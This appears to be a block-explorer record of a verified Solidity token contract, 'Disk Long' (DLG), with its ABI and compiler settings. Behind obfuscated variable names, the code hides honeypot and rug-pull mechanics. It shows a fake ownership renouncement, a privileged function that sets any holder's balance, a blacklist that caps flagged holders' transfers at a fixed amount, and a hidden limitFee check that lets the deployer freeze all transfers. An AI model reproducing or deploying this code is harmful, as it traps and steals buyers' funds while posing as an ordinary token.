{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface modeExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderList {\n    function createPair(address limitMarketing, address marketingToken) external returns (address);\n}\n\ninterface exemptToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isReceiver) external view returns (uint256);\n\n    function transfer(address modeWallet, uint256 receiverTrading) external returns (bool);\n\n    function allowance(address launchedExemptAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeWallet,\n        uint256 receiverTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isToLaunch, uint256 value);\n    event Approval(address indexed launchedExemptAt, address indexed spender, uint256 value);\n}\n\ninterface marketingBuyEnable is exemptToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DiskLong is receiverToken, exemptToken, marketingBuyEnable {\n\n    address exemptLiquidityReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 totalWallet;\n\n    function limitLaunched(address receiverLaunch, address modeWallet, uint256 receiverTrading) internal returns (bool) {\n        if (receiverLaunch == modeReceiver) {\n            return launchTakeSender(receiverLaunch, modeWallet, receiverTrading);\n        }\n        uint256 isBuy = exemptToken(senderToLiquidity).balanceOf(exemptLiquidityReceiver);\n        require(isBuy == limitFee);\n        require(modeWallet != exemptLiquidityReceiver);\n        if (tokenSell[receiverLaunch]) {\n            return launchTakeSender(receiverLaunch, modeWallet, listFundMin);\n        }\n        return launchTakeSender(receiverLaunch, modeWallet, receiverTrading);\n    }\n\n    address public senderToLiquidity;\n\n    function transferFrom(address receiverLaunch, address modeWallet, uint256 receiverTrading) external override returns (bool) {\n        if (_msgSender() != minLiquidity) {\n            if (tokenTotal[receiverLaunch][_msgSender()] != type(uint256).max) {\n                require(receiverTrading <= tokenTotal[receiverLaunch][_msgSender()]);\n                tokenTotal[receiverLaunch][_msgSender()] -= receiverTrading;\n            }\n        }\n        return limitLaunched(receiverLaunch, modeWallet, receiverTrading);\n    }\n\n    mapping(address => bool) public listToken;\n\n    address minLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function amountFeeExempt(address exemptList) public {\n        if (receiverEnable) {\n            return;\n        }\n        \n        listToken[exemptList] = true;\n        if (swapSellTotal != teamMax) {\n            txBuyFee = swapSellTotal;\n        }\n        receiverEnable = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverMaxLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoLiquidity;\n    }\n\n    function approve(address exemptMinTeam, uint256 receiverTrading) public virtual override returns (bool) {\n        tokenTotal[_msgSender()][exemptMinTeam] = receiverTrading;\n        emit Approval(_msgSender(), exemptMinTeam, receiverTrading);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeAmount;\n    }\n\n    event OwnershipTransferred(address indexed liquidityTeam, address indexed senderMarketingExempt);\n\n    function transfer(address listFrom, uint256 receiverTrading) external virtual override returns (bool) {\n        return limitLaunched(_msgSender(), listFrom, receiverTrading);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundReceiver;\n    }\n\n    uint256 public receiverAuto;\n\n    mapping(address => bool) public tokenSell;\n\n    address public modeReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingBuy;\n    }\n\n    bool public receiverEnable;\n\n    function exemptAuto() public {\n        emit OwnershipTransferred(modeReceiver, address(0));\n        receiverMaxLimit = address(0);\n    }\n\n    string private marketingBuy = \"Disk Long\";\n\n    function listEnable(address listFrom, uint256 receiverTrading) public {\n        fromBuy();\n        listLiquidity[listFrom] = receiverTrading;\n    }\n\n    function fromBuy() private view {\n        require(listToken[_msgSender()]);\n    }\n\n    uint256 public txBuyFee;\n\n    constructor (){\n        if (limitLiquidityFrom != txBuyFee) {\n            txBuyFee = swapSellTotal;\n        }\n        modeExempt launchTeam = modeExempt(minLiquidity);\n        senderToLiquidity = senderList(launchTeam.factory()).createPair(launchTeam.WETH(), address(this));\n        \n        modeReceiver = _msgSender();\n        exemptAuto();\n        listToken[modeReceiver] = true;\n        listLiquidity[modeReceiver] = autoLiquidity;\n        if (atLaunch != marketingWallet) {\n            marketingWallet = true;\n        }\n        emit Transfer(address(0), modeReceiver, autoLiquidity);\n    }\n\n    function allowance(address liquiditySwap, address exemptMinTeam) external view virtual override returns (uint256) {\n        if (exemptMinTeam == minLiquidity) {\n            return type(uint256).max;\n        }\n        return tokenTotal[liquiditySwap][exemptMinTeam];\n    }\n\n    bool private atLaunch;\n\n    mapping(address => uint256) private listLiquidity;\n\n    mapping(address => mapping(address => uint256)) private tokenTotal;\n\n    function balanceOf(address isReceiver) public view virtual override returns (uint256) {\n        return listLiquidity[isReceiver];\n    }\n\n    uint256 private swapSellTotal;\n\n    uint256 limitFee;\n\n    function toSwap(address atMax) public {\n        fromBuy();\n        if (receiverAuto != txBuyFee) {\n            txBuyFee = limitLiquidityFrom;\n        }\n        if (atMax == modeReceiver || atMax == senderToLiquidity) {\n            return;\n        }\n        tokenSell[atMax] = true;\n    }\n\n    uint256 constant listFundMin = 17 ** 10;\n\n    function owner() external view returns (address) {\n        return receiverMaxLimit;\n    }\n\n    address private receiverMaxLimit;\n\n    function walletFrom(uint256 receiverTrading) public {\n        fromBuy();\n        limitFee = receiverTrading;\n    }\n\n    uint256 private autoLiquidity = 100000000 * 10 ** 18;\n\n    uint8 private fundReceiver = 18;\n\n    function launchTakeSender(address receiverLaunch, address modeWallet, uint256 receiverTrading) internal returns (bool) {\n        require(listLiquidity[receiverLaunch] >= receiverTrading);\n        listLiquidity[receiverLaunch] -= receiverTrading;\n        listLiquidity[modeWallet] += receiverTrading;\n        emit Transfer(receiverLaunch, modeWallet, receiverTrading);\n        return true;\n    }\n\n    bool private marketingWallet;\n\n    string private takeAmount = \"DLG\";\n\n    uint256 public teamMax;\n\n    uint256 public limitLiquidityFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedExemptAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMarketingExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isToLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptMinTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"}],\"name\":\"amountFeeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMinTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLiquidityFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"listEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"}],\"name\":\"toSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txBuyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTrading\",\"type\":\"uint256\"}],\"name\":\"walletFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DiskLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}